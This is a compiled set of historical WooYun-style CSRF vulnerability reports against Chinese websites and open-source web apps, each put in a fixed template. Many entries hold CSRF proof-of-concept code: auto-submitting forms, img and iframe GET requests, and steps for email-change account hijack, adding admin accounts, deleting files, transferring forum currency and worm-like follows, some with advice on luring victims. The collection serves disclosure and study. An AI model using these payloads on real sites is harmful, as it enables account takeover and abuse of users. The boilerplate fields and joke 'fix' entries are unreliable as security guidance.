**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 废话不多说，直接上图说重点。在点击关注处抓包。请求的数据我就不再贴出来了。下面我贴一下这个漏洞的CSRF POC的代码。<html><head><title>CSRF POC</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="userId" value="255121945"><input type="hidden" name="typeId" value="1"></form><script>do

**绕过**: 直接利用

**修复**: 求礼物。才有动力继续往下挖！
---

---
### [wooyun-2012-08502] 某社交平台某社交平台某处CSRF漏洞
**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。

**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="type" value="support" /><input type="text" name="gid" value="100346" /><input type="text" name="appkey" value="" /

**绕过**: 直接利用

**修复**: 检查POST来路Referer在POST的信息中加token
---

---
### [wooyun-2014-063577] 坚果云存储web平台管理存在CSRF漏洞
**厂商**: 某网络科技公司 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http请求没有任何验证信息，可以构造提交

**POC**: 运行之后看结果

**绕过**: 直接利用

**修复**: http请求时候加入验证
---

---
### [wooyun-2012-013924] 某社交平台某社交平台某处CSRF自动加关注漏洞
**厂商**: 某社交平台某社交平台 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在网站框架内嵌入代码，当别人访问你的网站时，不需按关注按钮，即可自动关注你先前设定的账户。

**POC**: <html><body><form id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="fuid" value="1791277461" /></form><script>document.imlonghao.submit();</script></body></html>

**绕过**: 直接利用

**修复**: 程序员都懂的。
---

---
### [wooyun-2011-01373] 某社交平台某社交平台管理后台地址及一些信息泄漏和可能的攻击
**厂商**: 某社交平台 | **年份**: 2011 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某社交平台某社交平台管理后台会有管理员对传播的url进行专人审核，但是由于程序对referer的控制不严格，该url就会被一些统计系统捕捉到。https://example.com/[已脱敏]

**POC**: 在上面了

**绕过**: 直接利用

**修复**: 貌似不只某社交平台一个系统有这个问题，很多的管理后台都会有这种风险，建议在跳转外部地址时去掉里面的referer
---

---
### [wooyun-2013-036817] 爱卡汽车网一处鸡肋csrf缺陷
**厂商**: 爱卡汽车网 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 上次有个缺陷，很鸡肋，剑心他妹的给我不通过~https://example.com/[已脱敏] -

**绕过**: 直接利用

**修复**: 雅蠛蝶
---

---
### [wooyun-2015-0116229] 某视频网站劫持任意帐号（需交互）
**厂商**: 某门户网站 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某视频网站的crossdomain配置为*所以，任意域的flash都可发起请求我们随便找个操作试试，比如修改昵称：请求包：https://example.com/[已脱敏]

**POC**: POC：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: *号配置是要不得滴
---

---
### [wooyun-2013-020730] ThinkSNS V3缺陷-01
**厂商**: ThinkSNS | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 刷粉丝漏洞！可CSRF，可首页蠕虫。仅测试！目测现在官方V3 用户3K+，若要刷粉，请看这里。站点：https://example.com/[已脱敏] /t3/index.php?app=public&mod=Follow&act=doFollow&fid=39XX HTTP/1.1取消关注：GET /t3/index.php?app=public&mod=Follow&act=unFollow&fid=39XX HTTP/1.1当然，这个fid就是需要被照顾的对象啦！刷起来

**POC**: 利用方式可以在ThinkSNS 站内任何地方插入此链接，当然，最直接的就是放到首页去了！任何人看到首页的这条动态信息，点击就能自动关注此fid当然，为了效果更好，你可以把内容做的更具有吸引力！当其他用户点击了此条动态效果关注成功。关注失败，因为这是我自己，自己不能关注自己。很快，就收到新粉丝通知不管你是写日志，更新状态，都可以讲此动态同步到首页，发一条某社交平台，让大家都来关注你！仅测试，未蠕

**绕过**: 直接利用

**修复**: 防csRF，各种加token啥的。
---

---
### [wooyun-2013-035533] 某门户网站CSRF实例一:删除指定用户博客文章
**厂商**: 某门户网站 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 构造以下表单<form action="https://example.com/[已脱敏]" method="post" ><input type="hidden" name="ids" value="275280127"><input type="submit" value="ok"></form>ids 为博客文章 ID ，查找方法:文章的URL直接显示利用方法：通过各种渠道（邮箱，某社交平台，私信，消息）诱骗对方打开你的地址。

**绕过**: 直接利用

**修复**: 防御关注和跟随的CSRF防御得挺好的。
---

---
### [wooyun-2012-05818] 某搜索引擎wap贴吧csrf
**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在贴吧发个图片，再把图片重定向：https://example.com/[已脱敏]

**POC**: 去年的栗子 https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: =。=
---

---
### [wooyun-2015-0145804] 九阳智能豆浆机设备设计不当存在安全隐患可被远程控制（有利用前提）
**厂商**: joyoung.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 九阳豆浆机本身开放两个端口1. 80 端口开放 http 服务，需要 basic 认证；2. 8899 端口为 tcp 端口；对固件进行分析可能会更彻底些，通过如下两种途径都能够获取到固件1. 通过类似 https://example.com/[已脱敏] 地址从官网获取固件；2. 拆机从 flash 中 dump 固件；通过 strings 和 ida 对固件进行分析，得到如下信息：1. 设备 WIFI 模块使用的是 Hi-Flying 的 HF-LPB100 解决方案2. HF-LPB100 提供 80 服务，默认用户名密码均为 admin，九阳修改为：Joyoung-IOT / jyyjy3. 8899 为 WIFI 模块的 tcp 调试端口，通

**POC**: 我的设备目前已经被拆解了，之前没保留远程控制的图片，不过你们看漏洞描述应该就明白了。

**绕过**: 直接利用

**修复**: 1. 限制 80 8899 端口，尽量关闭
---

---
### [wooyun-2013-022555] 千品网csrf可劫持账户
**厂商**: 千品网 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 千品网修改邮箱处未验证token,可通过一个精心构造的的表单修改中招者的邮箱，达到劫持的目的。由于邮箱需要唯一性，所以可以通过一个数组来随机抽取。

**POC**: POC:<html><body><form name="csrf" action="https://example.com/[已脱敏]" method="POST"><input type=text name=oe value="root@wooyun.org"></input><script>var email =['root1@wooyun.org','root2@wooyun.org','root3@wooyun.org','root4@wooyun.org','root5@wooyun.org','root6@wooyun.org','root

**绕过**: 直接利用

**修复**: 加上随机的token求20rank，求礼物。
---

---
### [wooyun-2015-0109340] 某生鲜电商可修改他人收获地址手机号等(csrf二)
**厂商**: fruitday.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-022062] 某社交平台CSRF刷粉丝漏洞
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某社交平台CSRF刷粉丝漏洞，直接的链接。。。可直接 img可 img 或 iframe ，具体利用，你懂得https://example.com/[已脱敏] src="https://example.com/[已脱敏]" />这里就不详细证明了。。自己玩去。。。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们经验丰富
---

---
### [wooyun-2015-0101297] Modoer点评系统CSRF后台添加管理员
**厂商**: modoer.com | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 后台管理

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: Modoer点评系统CSRF后台添加管理员

**POC**: 截断抓包我们发现没有任何验证 ，构造表单这样就给后台添加了一个管理员

**绕过**: 直接利用

**修复**: 加token
---

---
### [wooyun-2015-092032] 美橙互联CSRF更改域名dns服务器
**厂商**: 美橙互联 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 美橙互联CSRF更改域名dns服务器处没有设置token等随机值验证。导致csrf。全站都没有token。因为只有一个域名可以测试 所以目前只能挖掘到域名dns更改的csrf。目测云主机等皆可。

**POC**: 更改dns抓包查看请求没有任何token等随机值验证。直接构造表单即可 。

**绕过**: 直接利用

**修复**: 添加token即可。
---

---
### [wooyun-2013-036196] 社区基本可删除指定回复。。
**厂商**: 乌云官方 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 见https://example.com/[已脱敏] ID】&x.jpg，管理人员访问该贴时即可删除该条回复。妈妈再也不用担心我在社区跟别人吵架吵不过对方了。

**POC**: 楼主回复二楼的一条回复和@xsser的一条回复已被成功删除。

**绕过**: 直接利用

**修复**: 加token啊。。
---

---
### [wooyun-2015-0136903] 某公众号管理员后台点击我发的消息链接，公众号介绍等设置就会被修改（绕过csrf防护）
**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入, 后台管理

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某互联网公司公共号后台的CSRF防护是有的，token防护加referrer限制，看起来很完美但是，由于设计的一些不合理，仍然可被csrf攻击，以下是详情1、公众号后台的token的设计问题公众号后台的csrf防护的token直接在后台所有操作的url中都会出现。这样token就有可能被http包里的referer字段发往第三方而泄露。我在以前写过的文章 https://example.com/[已脱敏] 里也提过这个问题的风险，当时我说削弱了防护体系。一旦其他的防护有问题的时候，这个问题就会被利用2、先偷TOKEN发送一个自己可控内容的https（公众后台是https的，只给https传递referrer）的url给某互联网公司公众账号，一旦他点击，管理后台url里的token就会发给我们。直接给公众号发送url，后台是不会识别的。需要一个小技巧来给后台发链接把链接到某互联网公司的聊天框中然后访问

**POC**: 拿了一个朋友的公众账号做测试，她不知情给公众账号发链接她点击后介绍被我修改成"hacked by koreans"由于她被我攻击，所以她要求我补偿她给她推广公众号，她的号和照片如下加他的公众账号吧，你的人生开始不再虚度

**绕过**: 过滤绕过

**修复**: 保护好token，不要放在get中post的请求不要让get发
---

---
### [wooyun-2013-019914] [CSRF系列]2-某门户网站任意账号劫持
**厂商**: 某门户网站 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某门户网站修改邮箱处存在csrf，更改掉了邮箱，账号不就控制了吗？但是，邮箱这个比较特殊，需要唯一性。于是，我们可以用 js从数组中随机抽取一个。另外，某门户网站修改邮箱的请求中还需要一个"oe"的参数（old email)，我还以为用不了的，可是这一项可以随便填，于是直接无视了。

**POC**: POC:<html><body><form name="csrf" action="https://example.com/[已脱敏]" method="POST"><input type=text name=oe value="root@wooyun.org"></input><script>var email =['root1@wooyun.org','root2@wooyun.org','root3@wooyun.org','root4@wooyun.org','root5@wooyun.org','root6@wooyun.org','root7

**绕过**: 直接利用

**修复**: 在请求中加入随机的token求20rank，求礼物。
---

---
### [wooyun-2013-038411] Discuz!全版本鸡肋CSRF漏洞一枚
**厂商**: Discuz! | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 全版本通杀！~不得不说dz的csrf几乎么有，这个csrf是收藏论坛板块的功能。直接get请求的csrf，下面是我本地搭建测试的。url为 https://example.com/[已脱敏]

**POC**: 。

**绕过**: 直接利用

**修复**: 1 get变post。2 加token。3 验证refer。
---

---
### [wooyun-2014-081333] 校无忧某系统CSRF添加后台管理员帐号（2种姿势）
**厂商**: 校无忧 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 测试系统信息（官网最新版）：官网：https://example.com/[已脱敏] 后台添加管理员帐号的请求如下。##2 经过测试发现请求没有验证referer，所以可以构造外部poc来进行CSRF攻击，POC测试代码如下。<form id="csrfdemo" action="http://[IP已脱敏] method="POST"><input type='hidden' name='Username' value='test111'><input type='hidden' name='Password1' value='123456'><input type='hidden' name='Password2' value='123456'

**POC**: 看上面。

**绕过**: 直接利用

**修复**: 1 验证请求类型。2 验证referer信息。
---

---
### [wooyun-2014-080152] PageAdmin CSRF漏洞#1
**厂商**: pageadmin.net | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 密码修改功能没有做任何的校验：

**POC**: 密码修改功能没有做任何的校验：

**绕过**: 直接利用

**修复**: 旧密码确认token验证码refer验证等...
---

---
### [wooyun-2013-036968] 某搜索引擎贴吧某功能CSRF漏洞outoken参数问题
**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我语文表达不好...=_=,还有下面有些是猜测1.这个是新的连接：https://example.com/[已脱敏]

**POC**: 1.没有获取outoken值2.发带那三个带有自定义outoken值连接的图片3.一获二掉三酱油4.获取到的outoken值5.然后就掉了.....

**绕过**: 直接利用

**修复**: 动态获取(这也是猜的)
---

---
### [wooyun-2013-026870] 某社交平台Referer判断不严谨可CSRF加粉
**厂商**: 某社交平台某社交平台 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 和我上一个漏洞一样，某社交平台对某些应用带有自动授权行为。第三方应用不严谨导致漏洞存在（这个应用貌似也是某社交平台官方的）。主要是Referer判断不严谨。可以导致https://example.com/[已脱敏] 这种域名欺诈。

**POC**: 如果微问应用没有授权，使用强制加载页面则可自动授权。如果以前用过直接构造From Post即可。虽然加了不能iframe加载，也可以绕过的。<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN""https://example.com/[已脱敏]"><html xmlns="https://example.com/[已脱敏]"><head><meta http-equiv="Content-Type" content="text/html; charset=u

**绕过**: 直接利用

**修复**: 你们懂的。
---

---
### [wooyun-2013-035646] 某体育社区体育网某功能存在csrf可转账论坛虚拟币
**厂商**: 某体育社区体育网 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某体育社区有个银行功能, 存款单位为卡路里这次试了一下抓包看到过程没有token, refer去掉后也依旧转帐成功, 证明存在CSRF可能性

**POC**: 1. 利用xss.js中的代码，在服务器上建立一个html页面<html><script src="xss.js"></script><script>xss.csrf(url="https://example.com/[已脱敏]", {"action": "virement", "pwuser": "admin", "to_money": "50", "content_plus": "csrf"});</script></html>2. 用户点击后就会自动给admin用户转帐50卡路里3. 利用方面主要依赖钓鱼技巧，给特定用户发链接钓其中招

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-027028] 虾米网CSRF漏洞可以导致刷粉丝,望其他接口也注意
**厂商**: 虾米网 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2013-032778] 再续时光网csrf漏洞
**厂商**: 时光网 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 直接get啥处理都没,5875540为ID号添加关注https://example.com/[已脱敏]

**POC**: 粉丝不在多，在于质量可靠

**绕过**: 直接利用

**修复**: 礼物奉上
---

---
### [wooyun-2015-0101075] emlog可任意删除文件
**厂商**: emlog.net | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: data.phpif ($action == 'dell_all_bak') {if (!isset($_POST['bak'])) {emDirect('./data.php?error_a=1');} else{foreach ($_POST['bak'] as $val) {unlink($val);}emDirect('./data.php?active_del=1');}}需要后台登录，但是没有做来路判断可以使用csrf

**POC**: <form action=http://localhost/emlog/admin/data.php?action=dell_all_bak method=POST><input type="text" name="bak[]" value="moon.php" /></form><script> document.forms[0].submit(); </script>删除moon.php

**绕过**: 直接利用

**修复**: Token
---

---
### [wooyun-2013-021598] 某社交平台OAuth2.0获取Authorization Code过程隐患
**厂商**: 某门户网站 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 参数注入

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: state参数可用于防止跨站请求伪造（CSRF）攻击，在某门户网站的文档页面中，参数列表列出了此参数：https://example.com/[已脱敏] @HorseLuke 前辈的博客：https://example.com/[已脱敏]

**POC**: 某社交平台获取Authorization Code请求和response看标红部分就可以了，简单明了。下图是某社交平台某社交平台的正常状态，state都是乱填的，就是表达一下这个意思。

**绕过**: 直接利用

**修复**: 排查代码，正常返回state就行了。最重要的接口参数部分文档和代码怎么都对不上号。
---

---
### [wooyun-2013-022628] 某社交平台某社交平台CSRF（GET型）发微薄，可蠕虫
**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题页面https://example.com/[已脱敏] 把地址用图片的形式发到某社交平台自带的论坛里[img]url[/img]只要别人一打开帖子就中招。也可以用邮件以嵌入图片的形式发到邮箱里，一旦发起GET访问就中招。影响范围很大！

**POC**: <img src="https://example.com/[已脱敏]"/>

**绕过**: 直接利用

**修复**: 增加限制
---

---
### [wooyun-2014-075609] KPPW开源威客系统存在刷钱漏洞（存在利用条件）
**厂商**: keke.com | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 后台管理

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我们先来注册一个帐号注册成功之后，进入下一个页面http://localhost/index.php?do=user他的地址为http://localhost/index.php?do=seller&id=5529由此可见，我们的用户id为5529然后我们再来发布一个商品。http://localhost/index.php?do=pubgoods这里添加上我们伪造的urlhttp://localhost/admin/index.php?do=user&view=charge&valid=1&maxCash=100&maxCredit=&user=5529&cash_type=1&cash=100&charge_reason=&is_submit=1填写好了，然后发布。提交到后台。这种威客网站添加的商品，管理员肯定会在后台审核的。等管理员点进去之后，这里会get一个请求就是上面我们填写的地

**POC**: 下面来解释下为什么用上面的url。后台登录验证下id验证合格后提交 抓包伪造成GET然后加钱成功

**绕过**: 直接利用

**修复**: CSRF
---

---
### [wooyun-2015-0148950] 熊猫TV某处CSRF替换头像
**厂商**: 某直播平台 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 未修改之前url未验证token 只要登录的用户打开 都能修改成功修改之后

**POC**: <iframe src="https://example.com/[已脱敏]"></iframe>嵌入到一个html 到王校长 贴吧等地 发诱惑帖    把头像都改成XXOO 图片   特别是主播   这个无法想象。。。

**绕过**: 直接利用

**修复**: 我爱你
---

---
### [wooyun-2015-0122342] 途牛旅游网多处CSRF（修改资料、足迹、想去）
**厂商**: 途牛旅游网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 第一次传这么长的图，不知道会不会不清楚

**POC**: POC1（想去，执行后会在https://example.com/[已脱敏]  显示，需要等一会，多刷新几次）：<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="poiId" value="3922" /><input type="hidden" name="type" value="wantUser" /></form><script>document.forms[0].submit

**绕过**: 直接利用

**修复**: 完全不防御CSRF？
---

---
### [wooyun-2010-046] 某互联网公司Mail邮件泄露漏洞
**厂商**: 某互联网公司 | **年份**: 2010 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: 如上

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-070403] 某搜索引擎贴吧CSRF漏洞可刷会员关注
**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.去目标贴吧随便找个帖子，在帖子后面加上参数?fr_bdps_bottom_login=1&autolike=1,然后可以关注该贴吧2.https://example.com/[已脱敏])3.(1).如图，未关注状态(2).访问带参数的帖子，提示，已关注，然后跳转到帖子所在的贴吧(3)

**POC**: 1.访问帖子：https://example.com/[已脱敏] 即可关注我的贴吧(1).如图，未关注状态(2).访问带参数的帖子，提示，已关注，然后跳转到帖子所在的贴吧(3)

**绕过**: 直接利用

**修复**: 神秘钥匙皮肤，抽到2.5折
---

---
### [wooyun-2012-013813] SOHU CSRF再一弹，主站。别骂我，你们要通宵加班了!
**厂商**: 某门户网站 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 前面发完再看了下，发现sohu全站都基本没有对csrf作任何处理。。。。再发一次，提醒一下你们了。按照我混wooyun的经验，一个漏洞补好后，一定会在周边看看有没有同样的洞存在。再随便找一个，passport的csrf。passport的利害性我就不说了。这里演示修改用户身份证名字啦什么的，页面上说，身份证是找回帐号的唯一哦。。。 这次用GET，referer检测都失效了。而且不需要用户点击，打开邮箱/微播直接中标。额外的一个严重漏洞是，在页面上，身份证一设定就再不能修改了，可是我的csrf随便改。。。那限制直接无视。利用情景可以想象的。这个csrf发完我就不再发了看你们运气吧，你们好好审核代码吧，我估计通宵加班少不了了。。。补充一句，邮箱只是我利用的一个情景，其实，不管是某社交平台还是博客还是论坛，都可以成为利用道具的。

**POC**: 我演示是为了自己方便，其实用<img src>直接暴的。

**绕过**: 直接利用

**修复**: 请参考WIKI
---

---
### [wooyun-2013-040832] 西子论坛CSRF发私信~
**厂商**: bbs.xizi.com | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: url:https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-036146] 暴走漫画刷赞处csrf 漏洞
**厂商**: baozoumanhua.com | **年份**: 2013 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我们点ID下面的大拇指我们踩他下。。baozoumanhua.com/articles/4573284/dn这篇ID是：4573284  IE地址栏有

**POC**: 我们点ID下面的大拇指我们踩他下。。baozoumanhua.com/articles/4573284/dn这篇ID是：4573284  IE地址栏有

**绕过**: 直接利用

**修复**: 让王尼玛修复即可 。被恶意的人发到社交传播一下，我就不知道了。。。 你们就可能要删帖了。删好久~
---

---
### [wooyun-2013-026622] 某社交平台某社交平台关注CSRF
**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: API出现位置:https://example.com/[已脱敏] referer咩的，只有u内容为某社交平台id，好了，测试一下。

**POC**: <form method='post' action='https://example.com/[已脱敏]'><input type='text' value='1981622273' name='u' style='display:none!important;display:block;width=0;height=0' /></form><script>document.forms[0].submit();</script>页面保存 u值为某社交平台id 默认关注乌云某社交平台。

**绕过**: 直接利用

**修复**: 验证啊 验证啊
---

---
### [wooyun-2014-055519] 人人网之应用中心csrf #4
**厂商**: 人人网 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在人人开放平台无任何token造成了被csrf攻击的对象编辑处无tokenhttps://example.com/[已脱敏]

**POC**: 在人人开放平台无任何token造成了被csrf攻击的对象编辑处无tokenhttps://example.com/[已脱敏]

**绕过**: 过滤绕过

**修复**: Token ，并且检查下分站是否存在同样问题！
---

---
### [wooyun-2015-0103642] 折800某处一枚CSRF
**厂商**: 折800 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出现在收货地址https://example.com/[已脱敏] method="POST" name="form0" action="https://example.com/[已脱敏]"><input type="hidden" name="receiverName" value="111"/><input type="hidden" name="mobile" value="13800138000"/><input type="hidden" name="email" value=""/><input type="hidden" name="telCode" value=""/><input type="hidden

**POC**: 其实可以发现我表单写的postcode不是上图截下来的400000，是另外一个。那么使用519100这个code是否可以达到我们的目标呢？让我们看看可以看到转向页面报错了，那么我们再看看收货地址有没有增加可以看到页面报错，但是地址确实增加了。让我们再把code值改回400000看看可以看到是这样的，那么回到收货地址看看增加了。

**绕过**: 直接利用

**修复**: token
---

---
### [wooyun-2012-08579] 某社交平台某社交平台某处CSRF漏洞
**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

